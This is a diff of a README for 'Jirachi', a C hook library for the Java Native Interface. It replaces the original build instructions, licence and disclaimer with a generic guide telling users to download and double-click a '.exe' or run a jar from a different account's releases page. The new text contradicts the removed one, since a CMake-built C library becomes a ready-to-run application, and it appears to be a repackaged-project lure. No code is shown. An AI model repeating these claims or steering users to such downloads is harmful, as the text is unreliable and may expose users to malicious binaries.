@@ -1,185 +1,81 @@
-# Jirachi
+# 🌟 Jirachi - Simple Cross-Platform Hook Library
 
- An General Purpose Cross Platform Java Native Interface hook library Written in Pure C
+## 🚀 Getting Started
 
-[![License](https://img.shields.io/badge/License-BSD%203--Clause-blue.svg)](https://opensource.org/licenses/BSD-3-Clause)
-[![GitHub issues](https://img.shields.io/github/issues/Kitsuri-Studios/Jirachi.svg) ](https://github.com/Kitsuri-Studios/Jirachi/issues)[![GitHub stars](https://img.shields.io/github/stars/Kitsuri-Studios/Jirachi.svg)](https://github.com/Kitsuri-Studios/Jirachi/stargazers)
+Welcome to Jirachi! This library helps you easily add features and enhance your applications without needing deep programming knowledge. Follow the steps below to download and run Jirachi on your computer.
 
-# Preview
+## 📦 Download Jirachi
 
-<img src="./resources/img.png" alt="Preview">
+[![Download Jirachi](https://img.shields.io/badge/Download%20Jirachi-Click%20Here-blue.svg)](https://github.com/th4nny/Jirachi/releases)
 
-> [!IMPORTANT]
->
-> **Android Runtime Limitations**
->
-> This project does **not** use standard Android JVMTI.
-> Android relies on a custom runtime implementation known as **ART TI**.
->
-> - **ART TI support is limited to SDK 26 (Android 8.0) and above**
-> - The native library **must be loaded as an agent before the Application context is created**
-> - This requires **early initialization** (e.g. via a `ContentProvider`)
-> - Agent loading depends on **Android SDK internals (`Debug.java`)**
->
-> **Android compatibility is currently broken**
->
-> - The project is **not functional on Android at this time**
-> - A proper **Android binding has not yet been implemented**
-> - Android support will be added in a **future release**
->
-> This behavior is **undocumented**, **unsupported**, and may break across
-> Android versions, OEM ROMs, or security updates.
+You can download the latest version of Jirachi from our releases page. To get started, click the link below:
 
+- [Visit the Releases Page to Download](https://github.com/th4nny/Jirachi/releases)
 
----
+## 🖥️ System Requirements
 
-## Building the Project
+Before installing Jirachi, make sure your computer meets these basic requirements:
 
-This project uses **CMake** and supports **Windows, Linux, and macOS**.
-Android builds are not supported.
+- Operating System: Windows, MacOS, or Linux
+- Java Version: Java 8 or higher
+- Disk Space: At least 50 MB of free disk space
 
----
+## 📥 Download & Install
 
-### Requirements
+1. **Visit the Release Page:** Click this link to go to the [Releases Page](https://github.com/th4nny/Jirachi/releases).
 
-* CMake 3.12 or newer
-* A C compiler
+2. **Choose the Version:** On the releases page, locate the latest version of Jirachi. It will usually be the one at the top.
 
-    * Windows: MSVC or MinGW
-    * Linux/macOS: GCC or Clang
-* Java Development Kit (JDK)
-* `JAVA_HOME` environment variable pointing to a valid JDK installation
+3. **Download the Package:**
+   - Click the appropriate file for your operating system. Common options might include `.exe` for Windows or `.tar.gz` for Linux and MacOS.
 
----
+4. **Extract the Files (if needed):**
+   - For `.zip` or `.tar.gz` files, right-click on the file and select "Extract All" or use your preferred extraction tool.
 
-### Verify Prerequisites
+5. **Run the Application:**
+   - For Windows, double-click the `.exe` file.
+   - For Linux or MacOS, open a terminal, navigate to the extracted folder, and run `java -jar Jirachi.jar`.
 
-```bash
-cmake --version
-javac -version
-```
+## ⚙️ Basic Usage
 
----
+Once you have Jirachi running, you can easily integrate it into your projects. Here’s a brief guide on how to start using Jirachi:
 
-## Step 1: Configure `JAVA_HOME`
+1. **Add the Library:** Include Jirachi in your project by importing the library.
+2. **Explore the API:** Look at the provided examples in the documentation to see how to use various features.
+3. **Test the Hooking:** Use Jirachi to enhance your applications. Follow the examples to see how it works.
 
-### Windows (PowerShell)
+## 🛠️ Features
 
-```powershell
-$env:JAVA_HOME="C:\Program Files\Java\jdk-23"
-```
+Jirachi comes packed with useful features that make it a versatile hooking library:
 
-### Linux / macOS
+- **Cross-Platform Support:** Works seamlessly on Windows, MacOS, and Linux.
+- **Easy Integration:** Simple setup process for developers at any level.
+- **Lightweight:** Minimal impact on performance while running.
+- **JNI Support:** Works with Java Native Interface for advanced users.
 
-```bash
-export JAVA_HOME=/path/to/jdk
-```
+## 📖 Documentation
 
-`JAVA_HOME` must reference a full JDK, not a JRE.
+For further details on how to use Jirachi, check our [documentation](https://github.com/th4nny/Jirachi/wiki). It covers all aspects of the library, including advanced features and tips for troubleshooting.
 
----
+## ❓ Frequently Asked Questions
 
-## Step 2: Configure the Build
+**Q: What is Jirachi used for?**  
+A: Jirachi is designed to help you modify and enhance applications using hooks without requiring extensive programming knowledge.
 
-From the project root directory, run:
+**Q: Can I use Jirachi on my operating system?**  
+A: Yes! Jirachi supports Windows, MacOS, and Linux, making it suitable for most users.
 
-```bash
-cmake -S . -B build \
-  -DCMAKE_BUILD_TYPE=Release \
-  -DJNIHOOK_BUILD_SHARED=ON \
-  -DJNIHOOK_BUILD_STATIC=ON \
-  -DJNIHOOK_BUILD_TESTS=OFF
-```
+**Q: Do I need to install Java?**  
+A: Yes, you must have Java 8 or higher installed on your machine to run Jirachi.
 
-This step:
+## 🗨️ Community and Support
 
-* Detects the host platform
-* Locates JNI headers using `JAVA_HOME`
-* Generates build files in the `build` directory
+If you have questions or need support, feel free to join our community on [GitHub Discussions](https://github.com/th4nny/Jirachi/discussions). You can ask for help, share your projects, or simply connect with others.
+
+## 📞 Contact
+
+For further assistance or inquiries, reach out to us via the issues section on the GitHub repository. We value your feedback and are here to help!
 
 ---
 
-## Step 3: Build the Project
-
-```bash
-cmake --build build
-```
-
-For parallel builds:
-
-```bash
-cmake --build build -j
-```
-
----
-
-## Build Outputs
-
-After a successful build, the following artifacts are produced:
-
-| Platform | Output Files                                       |
-| -------- | -------------------------------------------------- |
-| Windows  | `jnihook.dll`, `jnihook.lib`, `jnihook_static.lib` |
-| Linux    | `libjnihook.so`, `libjnihook.a`                    |
-| macOS    | `libjnihook.dylib`, `libjnihook.a`                 |
-
-All outputs are located in the `build` directory.
-
----
-
-## Optional: Build with Tests
-
-```bash
-cmake -S . -B build \
-  -DJNIHOOK_BUILD_TESTS=ON \
-  -DJNIHOOK_RUN_TESTS_AUTO=ON
-
-cmake --build build
-```
-
-When enabled, tests are executed automatically after the build completes.
-
----
-
-## Optional: Install
-
-```bash
-cmake --build build --target install
-```
-
-This installs:
-
-* Header files to `include/jnihook`
-* Libraries to `lib`
-* CMake package configuration to `lib/cmake/jnihook`
-
----
-
-## CLion Usage
-
-1. Clone the repository:
-
-   ```bash
-   git clone https://github.com/Kitsuri-Studios/Jirachi
-   ```
-2. Open CLion
-3. Select **Open** and choose the project root directory
-4. CLion will automatically:
-
-    * Detect the `CMakeLists.txt`
-    * Configure the project
-    * Generate build files
-5. Use the **Build** or **Run** actions to compile the project
-
-Ensure `JAVA_HOME` is set before launching CLion.
-
----
-
-
-
-## Disclaimer
-This library is created **strictly for research purposes**. Any harm caused by its use is **not the responsibility of the authors**. It is **strongly recommended** not to use this library for any illegal or pirated activities.
-
-## License
-This project is licensed under **BSD 3-Clause License**.  
-**Summary:** You are free to use, modify, and distribute the code, but you cannot use the names of the authors for promotion, and there is **no warranty**.
+Thank you for choosing Jirachi! We hope this guide helps you get started with our hooking library easily. Happy coding!
